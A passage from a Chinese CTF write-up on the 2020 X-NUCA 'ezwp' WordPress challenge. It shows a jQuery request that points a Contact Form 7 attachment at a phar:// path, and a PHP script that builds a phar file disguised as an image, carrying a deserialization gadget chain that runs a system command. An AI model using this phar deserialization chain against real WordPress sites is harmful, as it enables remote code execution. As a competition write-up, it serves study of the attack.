class="string">&quot;Reply-To: [your-email]&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[attachments]&quot;</span>: <span class="string">&quot;phar://./wp-content/uploads/2020/12/phar.jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[use_html]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[exclude_blank]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">		<span class="string">&quot;metakeyselect&quot;</span>:<span class="string">&quot;#NONE#&quot;</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">jQuery.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在dashboard那里执行这个js</p>
<p>成功写入<code>mail</code>:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png" alt="image8421"></p>
<p>因为没有<code>_form</code>属性（上面那个设置postmeta的一次只能设置一个），所以我们要手动提交<code>jQuery(&quot;.wpcf7-form&quot;).submit()</code>，接着就可以读取文件和反序列化了</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Kigkonsult</span>\<span class="title">Icalcreator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Vtimezone</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">timezonetype</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$components</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;components = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="title">require</span>( &#x27;<span class="title">wp</span>-<span class="title">load</span>.<span class="title">php</span>&#x27; );  <span class="comment">//???????</span></span><br><span class="line">	<span class="keyword">require_once</span>( dirname( <span class="keyword">__FILE__</span> ) . <span class="string">&#x27;/wp-includes/Requests/Utility/FilteredIterator.php&#x27;</span> );</span><br><span class="line">	<span class="variable">$arr</span>  = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;1&quot;</span> =&gt; <span class="string">&quot;/readflag&gt;/tmp/2.log&quot;</span>  <span class="comment">//payload</span></span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$obj_</span> = <span class="keyword">new</span> Requests_Utility_FilteredIterator( <span class="variable">$arr</span>, <span class="string">&quot;system&quot;</span> );</span><br><span class="line">	<span class="variable">$obj</span>  = <span class="keyword">new</span> Kigkonsult\Icalcreator\Vtimezone( <span class="variable">$obj_</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	@unlink( <span class="string">&quot;test.gif&quot;</span> );</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> Phar( <span class="string">&quot;test.phar&quot;</span> );</span><br><span class="line">	<span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setStub( base64_decode( <span class="string">&quot;/9j/4AAQSkZJRgABAgEASABIAAD//gARSlBFRyBJbWFnZXIgMi4x/9sAhAAGBAUGBQQGBgUGBwcGCAoQCgoJCQoUDg8MEBcUGBgXFBYWGh0lHxobIxwWFiAsICMmJykqKRkfLTAtKDAlKCkoAQMEBAUE&quot;</span> ) . <span class="string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span> );</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setMetadata( <span class="variable">$obj</span> );</span><br><span class="line">	<span class="variable">$phar</span>-&gt;addFromString( <span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span> ); <span class="comment">//????????</span></span><br><span class="line">	<span class="comment">//??????</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">	rename( <span class="string">&quot;test.phar&quot;</span>, <span class="string">&quot;test.gif&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" data-id="cku8j3ffw000bdan774g9aia5" data-title="2020xnuca_ezwp题解" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/7/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/9/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/10/01/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/">在线oj获取数据</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">巅峰极客</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E6%88%91%E7%9A%842020/">我的2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>